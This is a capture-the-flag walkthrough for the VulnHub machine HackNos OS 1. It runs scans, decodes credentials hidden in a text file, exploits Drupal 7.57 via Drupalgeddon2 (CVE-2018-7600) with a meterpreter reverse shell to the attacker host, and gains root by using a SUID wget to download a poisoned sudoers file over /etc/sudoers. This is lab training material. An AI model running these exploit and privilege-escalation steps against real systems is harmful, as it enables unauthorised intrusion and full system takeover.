
# HackNos OS 1 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/hacknos-os-hacknos,401/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.184   08:00:27:f9:4e:c0      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.184
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-24 10:21 -03
Nmap scan report for 192.168.1.115
Host is up (0.00026s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 43:0e:61:74:5a:cc:e1:6b:72:39:b2:93:4e:e3:d0:81 (RSA)
|   256 43:97:64:12:1d:eb:f1:e9:8c:d1:41:6d:ed:a4:5e:9c (ECDSA)
|_  256 e6:3a:13:8a:77:84:be:08:57:d2:36:8a:18:c9:09:d6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Hacker_James
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds
```

## Web Analysis

```
$ dirb http://192.168.1.184

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jan 24 11:42:29 2021
URL_BASE: http://192.168.1.184/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.184/ ----
==> DIRECTORY: http://192.168.1.184/drupal/                                                                          
+ http://192.168.1.184/index.html (CODE:200|SIZE:11321)                                                              
+ http://192.168.1.184/server-status (CODE:403|SIZE:278)                                                             
                                                                                                                     
---- Entering directory: http://192.168.1.184/drupal/ ----
==> DIRECTORY: http://192.168.1.184/drupal/includes/                                                                 
+ http://192.168.1.184/drupal/index.php (CODE:200|SIZE:7667)                                                         
==> DIRECTORY: http://192.168.1.184/drupal/misc/                                                                     
==> DIRECTORY: http://192.168.1.184/drupal/modules/                                                                  
==> DIRECTORY: http://192.168.1.184/drupal/profiles/                                                                 
+ http://192.168.1.184/drupal/robots.txt (CODE:200|SIZE:2189)                                                        
==> DIRECTORY: http://192.168.1.184/drupal/scripts/                                                                  
==> DIRECTORY: http://192.168.1.184/drupal/sites/                                                                    
==> DIRECTORY: http://192.168.1.184/drupal/themes/                                                                   
+ http://192.168.1.184/drupal/web.config (CODE:200|SIZE:2200)                                                        
+ http://192.168.1.184/drupal/xmlrpc.php (CODE:200|SIZE:42)                                                          
                                                                                                                     
---- Entering directory: http://192.168.1.184/drupal/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.184/drupal/misc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.184/drupal/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.184/drupal/profiles/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.184/drupal/scripts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.184/drupal/sites/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.184/drupal/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sun Jan 24 11:42:32 2021
DOWNLOADED: 9224 - FOUND: 6
```

```
$ nikto -h http://192.168.1.184
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.184
+ Target Hostname:    192.168.1.184
+ Target Port:        80
+ Start Time:         2021-01-24 11:42:36 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 59633974a1f12, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-01-24 11:43:50 (GMT-3) (74 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ gobuster dir -t 50 -u http://192.168.1.184 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.184
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,js,/,html
[+] Timeout:        10s
===============================================================
2021/01/24 11:42:47 Starting gobuster
===============================================================
/index.html (Status: 200)
/drupal (Status: 301)
/alexander.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2021/01/24 11:48:14 Finished
===============================================================
```

## alexander.txt Analysis

Downloading and analysing `alexander.txt` file.
```
$ wget http://192.168.1.184/alexander.txt

--2021-01-24 11:52:21--  http://192.168.1.184/alexander.txt
Connecting to 192.168.1.184:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 393 [text/plain]
Saving to: ‘alexander.txt’

alexander.txt                 100%[==============================================>]     393  --.-KB/s    in 0s      

2021-01-24 11:52:21 (103 MB/s) - ‘alexander.txt’ saved [393/393]

$ cat alexander.txt

KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==
```

The file contains an Base64 blob. Lets decode it.
```
$ cat alexander.txt | base64 -d

+++++ +++++ [->++ +++++ +++<] >++++ ++.-- ----- --.<+ ++[-> +++<] >+++.
----- ---.< +++[- >+++< ]>+++ ++.<+ +++++ +[->- ----- -<]>- ----- --.<+
++[-> +++<] >++++ +.<++ +++[- >++++ +<]>. ++.++ +++++ +.--- ---.< +++[-
>+++< ]>+++ +.<++ +++++ [->-- ----- <]>-. <+++[ ->--- <]>-- -.+.- ---.+
++.<
```

The decoded blob contains a Brainfuck encoded text.\
Using this Brainfuck Visualizer ( https://fatiherikli.github.io/brainfuck-visualizer/ ) we got this follow result:
```
james:Hacker@4514
```

Credentials:
* User: james
* Pass: Hacker@4514

## Drupal Access

This credentials allow us to login with **james** account in Drupal admin area.
```
http://192.168.1.184/drupal/
User: james
Pass: Hacker@4514
```

## Serching Vulnerabilities

After login we can find Drupal version: `7.57`\
\
In CVE Details of this Drupal version ( https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/version_id-242112/Drupal-Drupal-7.57.html ) are 7 vulnerabilities to explore.\
We will explore the **CVE-2018-7600**.\
It is a Remote Code Execution (RCE) and has a Metasploit module **Drupalgeddon2** ( https://www.exploit-db.com/exploits/44482 ).
```
msf6 > search drupalgeddon2

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
```

## Exploiting

```
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.1.184
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /drupal

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.168.1.184    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /drupal          yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.189    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)


msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit

[*] Started reverse TCP handler on 192.168.1.189:4444 
[*] Sending stage (39282 bytes) to 192.168.1.184
[*] Meterpreter session 1 opened (192.168.1.189:4444 -> 192.168.1.184:51676) at 2021-01-24 12:57:01 -0300

meterpreter > sysinfo
Computer    : hackNos
OS          : Linux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686
Meterpreter : php/linux

meterpreter > shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@hackNos:/var/www/html/drupal$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Flag #1 - User

```
www-data@hackNos:/home/james$ cat user.txt
   _                                  
  | |                                 
 / __) ______  _   _  ___   ___  _ __ 
 \__ \|______|| | | |/ __| / _ \| '__|
 (   /        | |_| |\__ \|  __/| |   
  |_|          \__,_||___/ \___||_|                                

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
```

## Privilege Escalation

```
www-data@hackNos:/home/james$ find / -type f -perm -u=s 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/pkexec
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/wget          <<<<
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/bin/ping6
/bin/umount
/bin/ntfs-3g
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
```

With `/usr/bin/wget` my idea is to overwrite `/etc/sudoers` file.\
First of all,on my host machine, I got an default `/etc/sudoers` file and add a full root permission for `www-data` user.
```
www-data ALL=(ALL) NOPASSWD:ALL
```

Follow the raw file:
```
$ cat sudoers_poisoned

#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification
# User alias specification
# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL
www-data ALL=(ALL) NOPASSWD:ALL       <<<<<<<<<

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
```

Now I exposed this file through python simple HTTP server:
```
$ python -m SimpleHTTPServer 8787
Serving HTTP on 0.0.0.0 port 8787 ...
```

In target machine we can use `/usr/bin/wget` to overwrite the original `/etc/sudoers` file:
```
www-data@hackNos:/$ wget http://192.168.1.189:8787/sudoers -O /etc/sudoers

wget http://192.168.1.189:8787/sudoers -O /etc/sudoers
--2021-01-24 23:07:50--  http://192.168.1.189:8787/sudoers
Connecting to 192.168.1.189:8787... connected.
HTTP request sent, awaiting response... 200 OK
Length: 791 [application/octet-stream]
Saving to: '/etc/sudoers'

/etc/sudoers        100%[===================>]     791  --.-KB/s    in 0s      

2021-01-24 23:07:50 (235 MB/s) - '/etc/sudoers' saved [791/791]
```

Now the user `www-data` has full root permission without password validation.
```
www-data@hackNos:/$ sudo bash
root@hackNos:/#

root@hackNos:/# id
uid=0(root) gid=0(root) groups=0(root)
```

## Flag #2 - Root

```
root@hackNos:~# cat /root/root.txt
    _  _                              _   
  _| || |_                           | |  
 |_  __  _|______  _ __  ___    ___  | |_ 
  _| || |_|______|| '__|/ _ \  / _ \ | __|
 |_  __  _|       | |  | (_) || (_) || |_ 
   |_||_|         |_|   \___/  \___/  \__|

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
Author : Rahul Gehlaut
Linkedin : https://www.linkedin.com/in/rahulgehlaut/
Blog : www.hackNos.com
```
